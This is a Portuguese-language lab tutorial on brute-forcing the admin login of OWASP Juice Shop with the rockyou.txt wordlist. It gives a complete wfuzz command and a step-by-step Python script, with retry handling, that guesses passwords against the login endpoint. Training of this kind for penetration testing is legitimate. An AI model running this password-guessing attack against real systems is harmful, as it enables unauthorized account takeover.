# Brute-force de Login — OWASP Juice Shop

Este documento explica o funcionamento de dois métodos equivalentes para realizar um ataque de força bruta (brute-force) contra o endpoint de login da aplicação vulnerável **OWASP Juice Shop**, usando a wordlist `rockyou.txt`.

>  **Aviso legal:** este material é destinado exclusivamente a fins educacionais e testes em ambientes controlados/autorizados (ex.: laboratórios de pentest como o Juice Shop). 

---

## Contexto

O **OWASP Juice Shop** expõe um endpoint de autenticação em:

```
POST http://<server_address>:3000/rest/user/login
```

O corpo da requisição é um JSON no formato:

```json
{
  "email": "admin@juice-sh.op",
  "password": "SENHA_TESTADA"
}
```

O objetivo é descobrir a senha do usuário `admin@juice-sh.op` testando, uma a uma, todas as senhas contidas na wordlist `rockyou.txt`.

---

## Método 1 — Wfuzz

```bash
wfuzz -c -w /usr/share/wordlists/rockyou.txt \
      -d "email=admin@juice-sh.op&password=FUZZ" \
      -Z --sc 200 \
      http://<server_address>:3000/rest/user/login
```

### Parâmetros

| Parâmetro | Descrição |
|---|---|
| `-c` | Ativa saída colorida no terminal, facilitando a leitura dos resultados. |
| `-w /usr/share/wordlists/rockyou.txt` | Define a wordlist utilizada para gerar os valores que substituirão a palavra-chave `FUZZ`. |
| `-d "email=admin@juice-sh.op&password=FUZZ"` | Define o corpo (`data`) da requisição HTTP POST, no formato `x-www-form-urlencoded`. A palavra `FUZZ` é o marcador que o Wfuzz substitui por cada linha da wordlist. |
| `-Z` | Modo "scan" — ignora erros de conexão e continua a execução em vez de abortar o processo. |
| `--sc 200` | Filtra e exibe apenas as respostas cujo **status code HTTP seja 200** (login bem-sucedido), ocultando as tentativas que retornam erro (normalmente `401 Unauthorized`). |
| `http://<server_address>:3000/rest/user/login` | URL alvo do ataque. |

## Método 2 — Script Python

O script Python (`scripts/app.py`) reproduz manualmente a mesma lógica do Wfuzz, permitindo maior controle sobre tratamento de erros, timeouts, reconexões e possibilitando adaptações para casos de bruteforce.

### Explicação

#### 1. Configuração inicial
```python
url = 'http://<server_address>:3000/rest/user/login'
email = 'admin@juice-sh.op'
wordlist = '/usr/share/wordlists/rockyou.txt'
```
Define a URL alvo, o e-mail da conta a ser atacada e o caminho da wordlist.

#### 2. Leitura da wordlist
```python
with open(wordlist, 'r', encoding='latin-1') as f:
    for i, line in enumerate(f):
```
- O arquivo é aberto com `encoding='latin-1'`, pois `rockyou.txt` contém bytes que não são válidos em UTF-8.
- `enumerate(f)` permite acompanhar o índice (`i`) de cada linha, usado depois para exibir o progresso.

#### 3. Tratamento da senha
```python
password = line.strip()
if not password:
    continue
```
Remove quebras de linha (`\n`) e espaços em branco. Linhas vazias são ignoradas.

#### 4. Montagem da requisição
```python
payload = {'email': email, 'password': password}
data = json.dumps(payload).encode()
req = urllib.request.Request(
    url,
    data=data,
    headers={'Content-Type': 'application/json'}
)
```
- Cria o corpo da requisição em **JSON**, corretamente formatado conforme a API do Juice Shop espera.
- Define o header `Content-Type: application/json`.

#### 5. Envio da requisição e verificação do resultado
```python
try:
    res = urllib.request.urlopen(req, timeout=10)
    print(f'[+] SENHA ENCONTRADA: {password}')
    sys.exit(0)
```
- Envia a requisição com timeout de 10 segundos.
- Se a resposta **não** gerar exceção (ou seja, status `200 OK`), a senha é considerada correta, é exibida na tela e o script é encerrado (`sys.exit(0)`).

#### 6. Tratamento de senha incorreta
```python
except urllib.error.HTTPError as e:
    print(f'[-] {i+1}: {password}')
```
- A API do Juice Shop retorna `401 Unauthorized` para credenciais inválidas, o que gera uma `HTTPError`.
- O script exibe o número da tentativa e a senha testada, e continua o loop.

#### 7. Tratamento de falhas de conexão (com retry)
```python
except (ConnectionResetError, TimeoutError, OSError) as e:
    print(f'[!] Erro de conexão em {password}, tentando de novo em 2s...')
    time.sleep(2)
    try:
        res = urllib.request.urlopen(req, timeout=10)
        print(f'[+] SENHA ENCONTRADA: {password}')
        sys.exit(0)
    except:
        print(f'[!] Falhou novamente, pulando...')
        continue
```
- Caso ocorra erro de rede (conexão resetada, timeout, etc.), o script aguarda **2 segundos** e tenta novamente a mesma senha.
- Se a segunda tentativa também falhar, a senha é descartada e o loop segue para a próxima.

### Fluxo resumido

```
Para cada senha na wordlist:
    ├── Envia POST com {email, senha} em JSON
    ├── Se status 200 → senha encontrada → encerra o script
    ├── Se status 401 (HTTPError) → senha incorreta → próxima
    └── Se erro de conexão → aguarda 2s → tenta de novo
         ├── Sucesso → senha encontrada → encerra
         └── Falha novamente → pula para a próxima senha
```

---
